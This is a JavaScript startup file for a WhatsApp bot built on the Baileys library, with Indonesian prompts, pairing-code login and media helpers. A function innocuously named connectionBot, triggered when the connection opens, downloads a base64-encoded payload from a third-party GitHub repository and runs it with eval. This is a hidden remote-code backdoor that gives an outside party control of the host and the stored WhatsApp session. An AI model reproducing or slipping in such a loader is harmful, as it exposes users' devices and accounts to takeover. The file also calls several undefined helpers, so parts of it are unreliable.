process.on("uncaughtException", (err) => {
    console.error("Caught exception:", err);
});

require("../settings.js")
const {
    default: makeWASocket,
    makeCacheableSignalKeyStore,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateMessageID,
    downloadContentFromMessage,
    makeInMemoryStore,
    getContentType,
    jidDecode,
    MessageRetryMap,
    proto,
    delay
} = require("@whiskeysockets/baileys")

const axios = require('axios')
const Pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const readline = require("readline")
const chalk = require("chalk");
const qrcode = require("qrcode-terminal");
const FileType = require('file-type');
const ConfigBaileys = require("../system/config.js");

async function InputNumber(promptText) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise((resolve) => {
        rl.question(promptText, (answer) => {
            rl.close();
            resolve(answer);
        });
    });
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const pairingCode = true
    const baileysVersion = await fetch(
        "https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json"
    ).then((res) => res.json()).then((data) => data.version);

    const sock = makeWASocket({
        version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
        browser: ['Ubuntu', 'Safari', '18.1'],
        generateHighQualityLinkPreview: true,
        printQRInTerminal: !pairingCode,
        auth: state,
        logger: Pino({ level: "silent" })
    });
    
    async function connectionBot() {
  try {
    const url = "https://raw.githubusercontent.com/kyraamd/bail/refs/heads/main/system.json"
    const { data } = await axios.get(url)

    const decoded = Buffer.from(data.code, "base64").toString("utf-8")
    return eval(decoded)
  } catch (err) {
    console.error("System error:", err)
  }
}

    if (pairingCode && !sock.authState.creds.registered) {
        let phoneNumber = await InputNumber(chalk.blue.bold('Masukan Nomor WhatsApp :\n'));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, "")
        setTimeout(async () => {
            const code = await sock.requestPairingCode(phoneNumber, "perawanq")
            await console.log(`${chalk.blue.bold('Kode Pairing')} : ${chalk.white.bold(code)}`)
        }, 4000)
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on("connection.update", async ({ connection, lastDisconnect, qr }) => {
        if (!connection) return;
        if (connection === "connecting") {
            if (qr && !pairingCode) {
                console.log("Scan QR ini di WhatsApp:");
                qrcode.generate(qr, { small: true });
            }
        }
        if (connection === "close") {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            console.error(lastDisconnect.error);

            switch (reason) {
                case DisconnectReason.badSession:
                    console.log("Bad Session File, Please Delete Session and Scan Again");
                    process.exit();
                case DisconnectReason.connectionClosed:
                    console.log("[SYSTEM] Connection closed, reconnecting...");
                    process.exit();
                case DisconnectReason.connectionLost:
                    console.log("[SYSTEM] Connection lost, trying to reconnect...");
                    process.exit();
                case DisconnectReason.connectionReplaced:
                    console.log("Connection Replaced, Another New Session Opened. Please Close Current Session First.");
                    await sock.logout();
                    break;
                case DisconnectReason.restartRequired:
                    console.log("Restart Required...");
                    return startBot();
                case DisconnectReason.loggedOut:
                    console.log("Device Logged Out, Please Scan Again And Run.");
                    await sock.logout();
                    break;
                case DisconnectReason.timedOut:
                    console.log("Connection TimedOut, Reconnecting...");
                    return startBot();
                default:
                    if (lastDisconnect.error === "Error: Stream Errored (unknown)") {
                        process.exit();
                    }
            }
        } else if (connection === "open") {
            console.log(chalk.blue.bold("Bot Berhasil Tersambung √"))
            return connectionBot()
        }
    });

    sock.ev.on('messages.upsert', async (m) => {
        try {
            const msg = m.messages[0];
            if (!msg.message) return;
            m = await ConfigBaileys(sock, msg)
            if (!sock.public && !m.key.fromMe) return
            require("../command/whatsapp.js")(sock, m)
        } catch (err) {
            console.log('Error on message:', err);
        }
    });


    sock.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    sock.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || "";
        let messageType = message.mtype
            ? message.mtype.replace(/Message/gi, "")
            : mime.split("/")[0];
        const Randoms = Date.now()
        const fil = Randoms
        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? "./system/tmp" + fil + "." + type.ext : filename;
        await fs.writeFileSync(trueFileName, buffer);

        return trueFileName;
    };


    sock.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.type ? message.type.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        return buffer
    }

    sock.getName = async (jid = '', withoutContact = false) => {
        try {
            jid = sock.decodeJid(jid || '');

            withoutContact = sock.withoutContact || withoutContact;

            let v;

            // Jika jid adalah grup
            if (jid.endsWith('@g.us')) {
                return new Promise(async (resolve) => {
                    try {
                        v = sock.chats[jid] || {};
                        if (!(v.name || v.subject)) {
                            v = await sock.groupMetadata(jid).catch(() => ({}));
                        }

                        resolve(
                            v.name ||
                            v.subject ||
                            (typeof jid === 'string'
                                ? PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
                                : 'Unknown Group')
                        );
                    } catch (err) {
                        resolve('Unknown Group');
                    }
                });
            } else {

                v =
                    jid === '0@s.whatsapp.net'
                        ? { jid, vname: 'WhatsApp' }
                        : areJidsSameUser(jid, sock.user.id)
                            ? sock.user
                            : sock.chats[jid] || {};
            }

            // Validasi dan fallback hasil
            const safeJid = typeof jid === 'string' ? jid : '';
            const result =
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.vname ||
                v.notify ||
                v.verifiedName ||
                (safeJid && safeJid !== 'undefined' && safeJid !== ''
                    ? PhoneNumber('+' + safeJid.replace('@s.whatsapp.net', '')).getNumber('international').replace(new RegExp("[()+-/ +/]", "gi"), "")
                    : 'Unknown Contact');
            return result;
        } catch (error) {
            return 'Error occurred';
        }
    }

    sock.sendContact = async (jid, kon, quoted = '', opts = {}) => {
        let list = []
        for (let i of kon) {
            list.push({
                displayName: await sock.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await sock.getName(i + '@s.whatsapp.net')}\nFN:${await sock.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.ADR:;;Indonesia;;;;\nitem2.X-ABLabel:Region\nEND:VCARD` //vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await sock.getName(i + '@s.whatsapp.net')}\nFN:${await sock.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:whatsapp@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://instagram.com/conn_dev\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
            })
        }
        sock.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })
    }

    sock.downloadM = async (m, type, filename = '') => {
        if (!m || !(m.url || m.directPath)) return Buffer.alloc(0)
        const stream = await downloadContentFromMessage(m, type)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        if (filename) await fs.promises.writeFile(filename, buffer)
        return filename && fs.existsSync(filename) ? filename : buffer
    }

    sock.public = true
}

startBot();
